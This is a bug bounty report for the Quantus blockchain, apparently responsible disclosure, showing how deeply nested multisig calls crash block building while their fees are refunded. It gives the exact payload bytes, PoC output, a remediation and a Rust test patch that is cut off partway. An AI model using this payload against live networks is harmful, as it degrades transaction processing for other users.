# 88969 bc high unbounded recursive decoding of opaque multisig calls makes block authors repeatedly execute unpaid mempool poison

**Submitted on Aug 16th 2026 at 02:41:21 UTC by @IronsideSec for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88969
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

## Description

## Brief/Intro

An unprivileged multisig signer can place a canonical 10,239-byte call containing 3,412 nested `Utility::batch` wrappers inside `Multisig::propose`. The signed outer extrinsic passes the runtime transaction-queue gate because FRAME's 256-level extrinsic depth check sees the inner call only as opaque bytes. During block construction, however, `Multisig::propose` decodes those bytes again without any depth limit. Recursive decoding exhausts the runtime's available stack space, and production Wasmtime contains the resulting linear-memory out-of-bounds condition as a runtime-API trap. The block builder then rolls back the tentative nonce, fee (including tip), weight, and state, while basic authorship treats the trap as a generic invalid candidate rather than resource exhaustion and continues with the next ready entry. A wave of independently signed entries therefore makes each default author keep processing after authorship’s post-soft-deadline fixed-amount resource-exhaustion mode would stop, for no per-attempt on-chain charge, and can consume the full transaction-selection budget on affected blocks.

## Vulnerability Details

### Root cause: a protected outer decode followed by an unprotected inner decode

The runtime limits a multisig call by **encoded byte length**, not by decoded structural depth:

```rust
pub type BoundedCallOf<T> = BoundedVec<u8, <T as Config>::MaxCallSize>;
```

The frozen runtime configures [`MaxCallSize = 10_240`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L648-L657). `Multisig::propose` accepts that opaque `BoundedCallOf<T>` and later performs a plain recursive decode:

```rust
let decoded_call = <T as Config>::RuntimeCall::decode(&mut &call[..])
    .map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
```

See [`BoundedCallOf<T>`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L251-L251) and the vulnerable [`propose` decode](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L594-L604). [`execute` repeats the same unrestricted decode](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L1123-L1126).

FRAME's Executive does use `DecodeLimit::decode_all_with_depth_limit(MAX_EXTRINSIC_DEPTH, ...)`, with `MAX_EXTRINSIC_DEPTH = 256`, in both the [`apply_extrinsic` path](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/frame/executive/src/lib.rs#L872-L886) and the [`validate_transaction` path](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/frame/executive/src/lib.rs#L979-L987) when it decodes the signed outer extrinsic. That protection does not recurse into a `BoundedVec<u8>`'s contents. The second decode in the pallet creates a new recursive trust boundary after the protected outer decode has completed.

The PoC's inner bytes are canonical SCALE, all-consuming, and contain no trailing garbage:

```
09 00 04 repeated 3,412 times || 00 00 00
```

At this commit:

* runtime pallet index `9` is [`Utility`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs#L250-L251);
* Utility call index `0` is [`batch`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/utility/src/lib.rs#L201-L204);
* compact vector length `1` is `04`;
* runtime pallet index `0` is [`System`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs#L220-L221); and
* System call index `0` is [`remark`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/frame-system/src/lib.rs#L720-L724), whose empty byte vector is `00`.

Every one-child wrapper is therefore three bytes, and the terminal empty remark is three bytes:

```
3,412 * 3 + 3 = 10,239 bytes <= 10,240-byte MaxCallSize
```

A canonical re-encode comparison does not reject this value. The missing invariant is a depth bound on the **inner** decode.

### Reachability through the signed transaction-queue gate

`TaggedTransactionQueue_validate_transaction` checks the signature, nonce, declared weight, and ability to pay the declared fee, but it does not dispatch `Multisig::propose`. Consequently it never reaches the recursive inner decode. The PoC proves both the single-item gate and a conservative, independently signed wave:

```
POOL_VALIDITY_OK=true
POOL_PRIORITY=5
POOL_PROPAGATE=true

WAVE_VALID_TRANSACTIONS=340
WAVE_UNIQUE_READY_TAGS=340
WAVE_TOTAL_BYTES=5298560
WAVE_PRIORITY=5000005
WAVE_MULTISIGS=4
```

The wave is not 340 replays of one hash. It deterministically generates 340 ML-DSA accounts, creates four multisigs (respecting `MaxSigners = 100`), signs one nonce-zero poison per account, and asserts all 340 validation results have `requires = []`, distinct `provides` tags, `propagate = true`, and the same priority. This directly establishes 340 independently ready runtime-valid candidates at the transaction pool's admission boundary. The default node pool limits are 36,772 transactions and 256 MiB, so this 340-item/5.30-MB wave is far below both [`--pool-limit` and `--pool-kbytes`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/cli/src/params/transaction_pool_params.rs#L42-L55).

### The production executor traps during block construction

The shipped client is explicitly a [`sc_executor::WasmExecutor`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/node/src/service.rs#L556-L560), instantiated for the full client at [`service.rs:599-605`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/node/src/service.rs#L599-L605).

When `BlockBuilder_apply_extrinsic` dispatches the admitted extrinsic, recursive `RuntimeCall::decode -> pallet_utility::Call::decode -> Vec<RuntimeCall>::decode` frames exhaust the runtime's stack space. In the built runtime Wasm, Wasmtime contains the resulting linear-memory boundary violation as `AbortedDueToTrap` with `out of bounds memory access`; the captured backtrace repeatedly traverses the recursive decoder. This is distinct from Wasmtime's engine `max_wasm_stack`/`StackOverflow` trap and does not rely on that limit. A subsequent `Core_version` call succeeds, proving the trap is safely contained rather than a native-process-only abort.

The uncached path includes compilation, so the PoC also warms a module through the same cached `CodeExecutor::call` path and separately measures the frozen-runtime Wasm apply path. On the final v5 validation run the cached apply returned the specifically asserted `AbortedDueToTrap`/out-of-bounds-memory error in `55.639167ms`, while the immediate recovery call completed in `143.125µs`.

### Why the work, fee, tip, nonce, and weight are free after each trap

The locked `sc-block-builder 0.48.0` implementation wraps each `apply_extrinsic` in `ApiExt::execute_in_transaction`. A runtime-API `Err` chooses `TransactionOutcome::Rollback`, and the extrinsic is not appended to the block:

```rust
self.api.execute_in_transaction(|api| {
    match api.apply_extrinsic(parent_hash, xt.clone()) {
        Ok(Ok(_)) => {
            extrinsics.push(xt);
            TransactionOutcome::Commit(Ok(()))
        }
        Ok(Err(validity)) => TransactionOutcome::Rollback(
            Err(ApplyExtrinsicFailed::Validity(validity).into())
        ),
        Err(error) => TransactionOutcome::Rollback(Err(Error::from(error))),
    }
})
```

For the executor trap in this report, `Error::from(error)` converts the runtime API's `ApiError` into `sp_blockchain::Error::RuntimeApiError(...)`; it is not an `ApplyExtrinsicFailed::Validity` result. The state-machine runtime boundary also calls `OverlayedChanges::exit_runtime`, which rolls back a dangling runtime-started storage transaction before the host transaction is rolled back.

The PoC models that exact split with:

```
host: OverlayedChanges::start_transaction()
runtime entry: enter_runtime()
production Wasm: BlockBuilder_apply_extrinsic(...)
runtime exit after trap: exit_runtime()
host error outcome: rollback_transaction()
```

Before the host rollback, the PoC directly observes the transaction extensions' tentative effects:

```
HOST_ROLLBACK_BEFORE=(9999400000000000, 0, 0, Weight { ref_time: 0, proof_size: 0 }, 3)
HOST_ROLLBACK_TENTATIVE=(9998383508906799, 0, 1, Weight { ref_time: 1000906093201, proof_size: 2656056 }, 4)
HOST_ROLLBACK_TENTATIVE_FEE=1016491093201
HOST_ROLLBACK_DECLARED_FEE=1016491093201
```

After the block-builder-shaped rollback:

```
HOST_ROLLBACK_AFTER=(9999400000000000, 0, 0, Weight { ref_time: 0, proof_size: 0 }, 3)
HOST_ROLLBACK_FEE_REFUNDED=true
HOST_ROLLBACK_TIP_REFUNDED=true
HOST_ROLLBACK_NONCE_REUSABLE=true
HOST_ROLLBACK_WEIGHT_FREE=true
HOST_ROLLBACK_OVERLAY_TOP_KEYS=0
HOST_ROLLBACK_OVERLAY_CHILD_KEYS=0
```

The same nonce-zero tipped extrinsic then revalidates at priority `5,000,005`. The multisig's own proposal fee/deposit/state are not written and then refunded; execution traps during decode **before that pallet logic is reached**. The tentative outer transaction fee, tip, nonce, block weight, and event are what the host transaction rolls back.

### Why basic authorship exceeds its resource-skip parameter

Quantus passes a [`10-second` build duration](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/node/src/service.rs#L486-L499) to QPoW, and [`create_proposal` forwards that `build_time` unchanged to the proposer](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/consensus/qpow/src/lib.rs#L605-L678). Locked `sc-basic-authorship 0.53.0` sets the absolute proposal deadline to proposal start plus 90% of that duration. Runtime initialization and inherents happen first, so transaction selection has **at most** 9 seconds; using the full 9 seconds in the PoC cost model is conservative.

Basic authorship maintains `skipped` and `MAX_SKIPPED_TRANSACTIONS = 8` for candidates that return `Validity(e)` where `e.exhausted_resources()`. The relevant locked branches are:

```rust
Err(ApplyExtrinsicFailed(Validity(e))) if e.exhausted_resources() => {
    pending_iterator.report_invalid(&pending_tx);
    limit_hit_reason = Some(EndProposingReason::HitBlockWeightLimit);
    if skipped < MAX_SKIPPED_TRANSACTIONS {
        skipped += 1;
    } else if (self.now)() < soft_deadline {
        // keep trying only before the soft deadline
    } else {
        break EndProposingReason::HitBlockWeightLimit
    }
}
Err(e) => {
    pending_iterator.report_invalid(&pending_tx);
    let error_to_report = match e {
        ApplyExtrinsicFailed(Validity(e)) => Some(e),
        _ => None,
    };
    // records the hash, but does not increment `skipped` or break
    unqueue_invalid.insert(pending_tx_hash, error_to_report);
}
```

Before the 50% soft deadline it may continue even after eight skips; once the soft deadline has passed and `skipped >= 8`, the resource-exhaustion arm stops building. This trap instead arrives from `sc-block-builder` as `sp_blockchain::Error::RuntimeApiError(...)` and enters the generic `Err(e)` arm. That arm reports the iterator item invalid, records its hash for later pool reporting, and continues; it neither increments `skipped` nor sets the resource-limit reason. The author therefore remains outside the post-soft-deadline fixed-amount mode and tries separately ready poison entries until the absolute proposal deadline.

After the loop, the node reports the bad hashes and the single-state pool removes/bans them. That does not make the first wave cheap for the author. Because nonce and fee state rolled back, an attacker can also submit new hashes after removal (for example, by changing `expiry`), or use another independently ready account. Source support for removal is in [`single_state_txpool.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/transaction-pool/src/single_state_txpool/single_state_txpool.rs#L384-L393) and [`validated_pool.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/transaction-pool/src/graph/validated_pool.rs#L795-L813).

### Priority and impact boundary

The attacker can attach a tip that pool validation believes will be paid, although it is refunded after the trap. With a one-micro-QUAN tip, the PoC observes:

```
POISON_XT_BYTES=15584
HIGH_TIP_POISON_DECLARED_FEE=1016491093201
HIGH_TIP_POISON_PRIORITY=5000005
NORMAL_TRANSFER_PRIORITY=735
```

This places the poison ahead of ordinary untipped transfers in the ready ordering. Priority is nevertheless finite and collateral-dependent. The PoC deliberately includes a control proving that a transfer tipped only 6,802 Planck has priority `5,000,205` and is ordered ahead of this particular poison.

For that reason, this report does **not** claim categorical “total network shutdown” and does not select the Critical impact “Network not being able to confirm new transactions.” Blocks/inherents continue, and sufficiently higher-priority candidates can be selected first. The directly supported impact is the program's High mempool-processing impact: default processing nodes are induced to execute a large sequence of expensive, ultimately free candidates from the mempool (roughly 162 on the measured host, with 340 independently ready entries validated), bypassing authorship's post-soft-deadline resource-exhaustion termination and consuming up to the available selection budget for all lower-priority traffic.

### Bypass of the public PR #608 mitigation

Pre-freeze [PR #608](https://github.com/Quantus-Network/chain/pull/608), merged as [`e127ffd810718e64c8a2c21393c270aa78ca3318`](https://github.com/Quantus-Network/chain/commit/e127ffd810718e64c8a2c21393c270aa78ca3318), explicitly recognized that structured `RuntimeCall` decode is `O(inner_call_count)`. It added the already configured `MaxInnerCallWeight` to `propose`'s upfront reservation and added full-weight burns on returned decode/post-decode failures.

This report concerns the incomplete mitigation's separate structural-safety bypass, not merely generic decode underweighting:

{% stepper %}
{% step %}

## `MaxInnerCallWeight` does not bound recursion

`MaxInnerCallWeight` constrains declared dispatch weight; it does not constrain codec recursion depth.
{% endstep %}

{% step %}

## The outer depth limit does not inspect opaque bytes

The canonical inner value bypasses Executive's depth limiter because the outer type is bytes.
{% endstep %}

{% step %}

## The trap occurs before decode returns

Recursive stack exhaustion reaches a contained Wasm linear-memory trap before `decode` returns `Ok` or `Err`, so PR #608's `err_burn_full_raw` path is unreachable.
{% endstep %}

{% step %}

## Block-builder rollback refunds the intended charge

The resulting `RuntimeApiError` makes the block builder roll back the very fee, tip, nonce, and weight intended to pay for the work.
{% endstep %}

{% step %}

## Authorship does not classify the trap as resource exhaustion

Basic authorship classifies the resulting `RuntimeApiError` outside the `exhausted_resources()` counter and post-soft-deadline termination branch.
{% endstep %}
{% endstepper %}

PR #608 is the closest public prior art and creates a material duplicate/known-surface risk: it names the same raw decoder, nested `Utility::batch`, inner-call-count complexity, and availability concern. The technical invariant and remediation here are nevertheless distinct: reserving/charging a dispatch-weight proxy cannot bound structural recursion, and the demonstrated trap never returns to PR #608's charge logic. The program mentions fix bypasses as potentially new bugs, but because #608 was public pre-freeze, this report does not treat that clause as dispositive; eligibility turns on triage recognizing this structural trap/rollback/authorship path as the new bypass rather than the already-public underweighting issue.

Later canonical-byte checks (including [`a86becfa`](https://github.com/Quantus-Network/chain/commit/a86becfa)) do not fix this payload because it is canonical and traps before any re-encode comparison. The post-freeze `upstream/main` inspected during validation still performed the same unrestricted `RuntimeCall::decode` at `propose`.

The May 2026 [`quantus-substrate-audit-20260513.pdf`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/audits/quantus-substrate-audit-20260513.pdf) discusses multisig weight/accounting and deferred decoding at a general level, but does not disclose the opaque second-decode depth-limit bypass, canonical stack poison, production Wasm trap, host rollback, or authorship-loop consequence. The program's listed known issues concern stale votes from removed referendum members, trusted-network miner/node plaintext, and future ZK-tree-depth/mining-quantization upgrades; none describes this decode-boundary or proposer-processing issue.

### Recommended remediation

Apply a strict, all-consuming structural depth limit every time opaque bytes become a `RuntimeCall`, including both `propose` and `execute`. Schematically:

```rust
let decoded_call = <T as Config>::RuntimeCall::decode_all_with_depth_limit(
    MAX_MULTISIG_CALL_DEPTH,
    &mut &call[..],
)
.map_err(|_| Self::err_burn_full_raw(Error::<T>::InvalidCall))?;
```

Use a small explicit `MAX_MULTISIG_CALL_DEPTH` that is covered by benchmarks and no greater than the runtime's outer extrinsic depth policy. Prefer accepting a typed/bounded call whose depth was already checked rather than storing arbitrary bytes and decoding them later. Keep the full-weight error handling as defense in depth, but do not treat a weight proxy as a recursion limit.

At the client layer, treat runtime-API traps during candidate application as resource exhaustion: stop after a small fixed number, apply per-origin/per-hash backoff before repeatedly executing replacements, and meter failed runtime calls outside state that will be rolled back. Those client mitigations reduce blast radius but do not replace fixing the runtime decode boundary.

## Impact Details

### Selected in-scope impact

**High — “Causing network processing nodes to process transactions from the mempool beyond set parameters.”** This exact impact appears in the Quantus Audit Competition's [Impacts in Scope](https://immunefi.com/audit-competition/audit-comp-quantus/scope/).

The relevant parameters are concrete: basic authorship enters a fixed-amount mode around its 50% soft deadline and, for `exhausted_resources()` results, terminates once the soft deadline has passed and its eight-skip allowance is exhausted. The crafted transaction surfaces depth/resource exhaustion as a generic `RuntimeApiError`, so neither that counter nor that termination condition is used. A default author instead processes separately ready poison entries until the absolute proposal deadline; because initialization and inherents precede selection, the available selection time is at most 9 seconds.

### Directly demonstrated consequences

On the frozen commit, the self-contained PoC directly demonstrates:

* a signed poison passes native and production-Wasm transaction-queue validation and is propagable;
* 340 independently signed nonce-zero poisons have 340 unique ready tags and total only 5,298,560 bytes;
* a cached production-Wasm apply traps after approximately 56 ms and the executor immediately remains usable;
* before rollback, exactly `1,016,491,093,201` Planck is withdrawn, nonce becomes 1, and `1,000,906,093,201 / 2,656,056` weight is recorded;
* `exit_runtime` plus the block-builder host rollback restores the entire balance (including tip), nonce, block weight, events, and overlay;
* the same nonce-zero poison revalidates at priority 5,000,005;
* 340 complete production-shaped apply/trap/runtime-cleanup/host-rollback attempts take **18.950986709 seconds** on the validation host, more than twice the conservative 9-second upper bound for transaction selection, while ending with the same observed free/reserved balance, nonce, block weight, and event-count tuple; and
* the hardware-portable cost check computes that 162 such entries exhaust 9 seconds on this host, versus a 17,225-entry limit imposed by the frozen default pool byte cap.

An author with this wave ahead of ordinary traffic expends the whole selection phase executing candidates that contribute no extrinsic, weight, fee, or nonce to the block. Transactions below the selected poison priority remain unvisited in that proposal. Repeating the wave against default producers can sustain the High availability/resource-consumption impact; the PoC does not claim that headers stop or that arbitrary higher bidders cannot escape.

### Feasibility and limits

The PoC funds every wave account with 2 QUAN and pays four one-time multisig-creation operations. Each poison is 15,584 bytes. The one-micro-QUAN tip is only validation collateral and is restored when the apply traps. The 340-item wave fits comfortably inside the default pool limits. An attacker can tune the refundable tip upward to place poison above more normal traffic, but must have enough balance in each independently ready payer for validation.

Timing is machine-dependent. The rollback harness uses the exact `OverlayedChanges`/`Ext` transaction split over an in-memory backend rather than instantiating a full database-backed client. The ignored cost-model test therefore does not require a fixed count to exceed nine seconds on every machine: it measures the complete failed-push average, conservatively computes `ceil(9-second upper bound / average)`, and asserts that the resulting wave fits both frozen default pool limits. The reproduced run used Darwin ARM64, `rustc 1.93.0`, and `cargo 1.93.0`; it required 162 measured entries while the byte limit alone allowed 17,225. The separate 340-entry runtime-validation test directly proves a conservative wave on this host, not a universal protocol constant.

### Explicit non-claims

This report does not claim:

* a process crash on production nodes (the production Wasm trap is contained);
* that a live `BasicPool`/P2P multi-producer network was instantiated by the test;
* that every possible transaction priority is censored;
* that block headers or inherents stop; or
* the Critical total-network-shutdown impact.

The signed runtime admission gate, distinct ready tags, production Wasm trap, production-shaped rollback, fee/nonce/weight restoration, priority boundary, and deadline-scale cost are directly tested. Pool ordering, generic-error iteration, deadline arithmetic, invalid-hash removal, and QPoW integration are tied to the exact locked source versions cited above.

## References

* [Scoped Quantus chain asset](https://github.com/immunefi-team/audit-comp-quantus-chain)
* [Frozen audit commit `3b243b870a5442a6e5f443056f67bbba87d472f5`](https://github.com/immunefi-team/audit-comp-quantus-chain/tree/3b243b870a5442a6e5f443056f67bbba87d472f5)
* [`BoundedCallOf<T>` and `MaxCallSize`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L186-L251)
* [Vulnerable `Multisig::propose` decode](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L522-L604)
* [Vulnerable `Multisig::execute` decode](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L1042-L1135)
* [Outer Executive depth-limited apply decode](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/frame/executive/src/lib.rs#L872-L886)
* [Outer Executive depth-limited validation decode](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/frame/executive/src/lib.rs#L979-L987)
* [Runtime System/Utility pallet indices](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs#L220-L251)
* [Runtime multisig bounds](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L648-L712)
* [Transaction-payment priority formula](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/transaction-payment/src/lib.rs#L856-L928)
* [QPoW's 10-second proposal duration](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/node/src/service.rs#L486-L499)
* [QPoW forwards `build_time` to basic authorship](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/consensus/qpow/src/lib.rs#L605-L678)
* [Production `WasmExecutor` client](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/node/src/service.rs#L556-L605)
* [Quantus transaction-pool defaults](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/cli/src/params/transaction_pool_params.rs#L42-L68)
* [`sc-block-builder 0.48.0` source](https://docs.rs/sc-block-builder/0.48.0/src/sc_block_builder/lib.rs.html)
* [`sc-basic-authorship 0.53.0` source](https://docs.rs/sc-basic-authorship/0.53.0/src/sc_basic_authorship/basic_authorship.rs.html)
* [`sp-state-machine 0.49.0` overlay runtime cleanup](https://docs.rs/sp-state-machine/0.49.0/src/sp_state_machine/overlayed_changes/mod.rs.html)
* [Pre-freeze PR #608](https://github.com/Quantus-Network/chain/pull/608) and [merge commit](https://github.com/Quantus-Network/chain/commit/e127ffd810718e64c8a2c21393c270aa78ca3318)
* [Quantus Audit Competition scope and impacts](https://immunefi.com/audit-competition/audit-comp-quantus/scope/)

## Proof of Concept

### What the PoC proves

The patch adds one self-contained integration-test file and only the test dependencies needed to run the frozen runtime through its production Wasmtime executor. It does not patch vulnerable production logic.

The tests cover:

{% stepper %}
{% step %}

## Canonical payload generation

Canonical generation of the 10,239-byte/3,412-level inner call.
{% endstep %}

{% step %}

## Runtime admission

Signed runtime queue admission and propagation.
{% endstep %}

{% step %}

## Independent ready transactions

340 independently signed, independently ready admission results across four multisigs.
{% endstep %}

{% step %}

## Production Wasm behavior

Production Wasm validation followed by the recursive-decode trap and executor recovery.
{% endstep %}

{% step %}

## Cached Wasm timing

Warmed Wasm trap timing.
{% endstep %}

{% step %}

## Rollback boundary

The exact host-overlay/runtime-overlay rollback boundary, including tentative and restored fee, tip, nonce, block weight, events, and storage.
{% endstep %}

{% step %}

## Priority comparison

Tipped-poison versus ordinary-transfer priority, including the higher-bid control.
{% endstep %}

{% step %}

## Deadline stress test

A 340-attempt production-shaped deadline stress test.
{% endstep %}
{% endstepper %}

The native stack-overflow control is marked ignored because executing it intentionally aborts the test process. The full normal command is safe.

### Reproduction steps

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain.git
cd audit-comp-quantus-chain
git checkout --detach 3b243b870a5442a6e5f443056f67bbba87d472f5

cat > /tmp/quantus-multisig-depth-wasm-poison-poc-v5.patch <<'PATCH'
diff --git a/Cargo.lock b/Cargo.lock
index 27452829..2898af35 100644
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -7715,6 +7715,8 @@ dependencies = [
  "qp-poseidon-core",
  "qp-scheduler",
  "qp-wormhole",
+ "sc-executor",
+ "sc-executor-common",
  "scale-info",
  "serde_json",
  "smallvec",
@@ -7722,12 +7724,14 @@ dependencies = [
  "sp-block-builder",
  "sp-consensus-qpow",
  "sp-core",
+ "sp-externalities",
  "sp-genesis-builder",
  "sp-inherents",
  "sp-io",
  "sp-offchain",
  "sp-runtime",
  "sp-session",
+ "sp-state-machine",
  "sp-storage",
  "sp-transaction-pool",
  "sp-version",
diff --git a/runtime/Cargo.toml b/runtime/Cargo.toml
index c428e0cb..3e73c066 100644
--- a/runtime/Cargo.toml
+++ b/runtime/Cargo.toml
@@ -76,7 +76,11 @@ substrate-wasm-builder = { optional = true, workspace = true, default-features =
 env_logger.workspace = true
 qp-dilithium-crypto.workspace = true
 qp-poseidon-core.workspace = true
+sc-executor = { workspace = true, features = ["std"] }
+sc-executor-common = { version = "0.43.0" }
+sp-externalities = { workspace = true, features = ["std"] }
 sp-io.workspace = true
+sp-state-machine = { workspace = true, features = ["std"] }
 
 [features]
 default = ["std"]
diff --git a/runtime/tests/depth_pipeline_poc.rs b/runtime/tests/depth_pipeline_poc.rs
new file mode 100644
index 00000000..6c5ae403
--- /dev/null
+++ b/runtime/tests/depth_pipeline_poc.rs
@@ -0,0 +1,632 @@
+//! PoC for opaque multisig `BoundedCall` bypassing Executive's depth limit.
+use codec::{Decode, Encode};
+use frame_support::{assert_ok, dispatch::GetDispatchInfo, traits::Currency, BoundedVec};
+use qp_dilithium_crypto::Dilithium65Pair;
+use quantus_runtime::{
+	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
+	Balances, BalancesCall, Executive, Multisig, Runtime, RuntimeCall, RuntimeOrigin, Signature,
+	SignedPayload, System, TxExtension, UncheckedExtrinsic, UNIT, VERSION,
+};
+use sc_executor::WasmExecutor;
+use sc_executor_common::runtime_blob::RuntimeBlob;
+use sp_core::{
+	traits::{CallContext, CodeExecutor, RuntimeCode, WrappedRuntimeCode},
+	Pair,
+};
+use sp_runtime::{
+	generic::Era,
+	traits::IdentifyAccount,
+	transaction_validity::{TransactionSource, TransactionValidity},
+	BuildStorage, MultiAddress,
+};
+use sp_state_machine::{Ext, InMemoryBackend, OverlayedChanges};
+use std::{borrow::Cow, collections::BTreeSet};
+
+const DEPTH: usize = 3412;
+
+/// Canonical SCALE for batch(batch(...batch(System::remark([]))...)), one child per batch.
+/// Each wrapper is three bytes: RuntimeCall::Utility=9, Utility::batch=0,
+/// Compact<Vec length 1>=4. 3412 * 3 + 3 = 10,239 <= MaxCallSize (10,240).
+fn poison_bytes() -> Vec<u8> {
+	let mut bytes = Vec::with_capacity(DEPTH * 3 + 3);
+	for _ in 0..DEPTH {
+		bytes.extend_from_slice(&[9, 0, 4]);
+	}
+	bytes.extend_from_slice(&[0, 0, 0]); // System::remark { remark: vec![] }
+	assert_eq!(bytes.len(), 10_239);
+	bytes
+}
+
+fn assert_wasm_oob_trap<T, E: core::fmt::Debug>(result: &Result<T, E>, label: &str) {
+	let error = result.as_ref().err().expect("recursive poison must return a Wasm error");
+	let error_debug = format!("{error:?}");
+	let is_oob_trap = error_debug.contains("AbortedDueToTrap")
+		&& error_debug.contains("out of bounds memory access");
+	eprintln!("{label}_IS_OOB_TRAP={is_oob_trap}");
+	assert!(is_oob_trap, "{label} returned an unexpected executor error: {error_debug}");
+}
+
+fn tx_ext_with_tip(nonce: u32, tip: u128) -> TxExtension {
+	(
+		frame_system::CheckNonZeroSender::<Runtime>::new(),
+		frame_system::CheckSpecVersion::<Runtime>::new(),
+		frame_system::CheckTxVersion::<Runtime>::new(),
+		frame_system::CheckGenesis::<Runtime>::new(),
+		frame_system::CheckEra::<Runtime>::from(Era::immortal()),
+		frame_system::CheckNonce::<Runtime>::from(nonce),
+		frame_system::CheckWeight::<Runtime>::new(),
+		ReversibleTransactionExtension::<Runtime>::new(),
+		WormholeProofRecorderExtension::<Runtime>::new(),
+		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(tip),
+		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
+		frame_system::WeightReclaim::<Runtime>::new(),
+	)
+}
+
+fn sign(pair: &Dilithium65Pair, call: RuntimeCall, nonce: u32) -> UncheckedExtrinsic {
+	sign_with_tip(pair, call, nonce, 0)
+}
+
+fn sign_with_tip(
+	pair: &Dilithium65Pair,
+	call: RuntimeCall,
+	nonce: u32,
+	tip: u128,
+) -> UncheckedExtrinsic {
+	let sender = pair.public().into_account();
+	let genesis_hash = System::block_hash(0);
+	let ext = tx_ext_with_tip(nonce, tip);
+	let payload = SignedPayload::from_raw(
+		call.clone(),
+		ext.clone(),
+		(
+			(),
+			VERSION.spec_version,
+			VERSION.transaction_version,
+			genesis_hash,
+			genesis_hash,
+			(),
+			(),
+			(),
+			(),
+			(),
+			None,
+			(),
+		),
+	);
+	let signature = payload.using_encoded(|encoded| pair.sign(encoded));
+	UncheckedExtrinsic::new_signed(
+		call,
+		MultiAddress::Id(sender),
+		Signature::Dilithium65(signature),
+		ext,
+	)
+}
+
+fn setup() -> (sp_io::TestExternalities, Dilithium65Pair, sp_runtime::AccountId32) {
+	let pair = Dilithium65Pair::from_seed_slice(&[42u8; 32]).unwrap();
+	let other_pair = Dilithium65Pair::from_seed_slice(&[43u8; 32]).unwrap();
+	let signer = pair.public().into_account();
+	let other = other_pair.public().into_account();
+	let storage = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
+	let mut ext = sp_io::TestExternalities::new(storage);
+	let multisig = ext.execute_with(|| {
+		Balances::make_free_balance_be(&signer, 10_000 * UNIT);
+		System::set_block_number(1);
+		assert_ok!(Multisig::create_multisig(
+			RuntimeOrigin::signed(signer.clone()),
+			vec![signer.clone(), other.clone()],
+			2,
+			7,
+		));
+		Multisig::derive_multisig_address(&[signer.clone(), other], 2, 7)
+	});
+	(ext, pair, multisig)
+}
+
+fn poison_call(multisig: sp_runtime::AccountId32, expiry: u32) -> RuntimeCall {
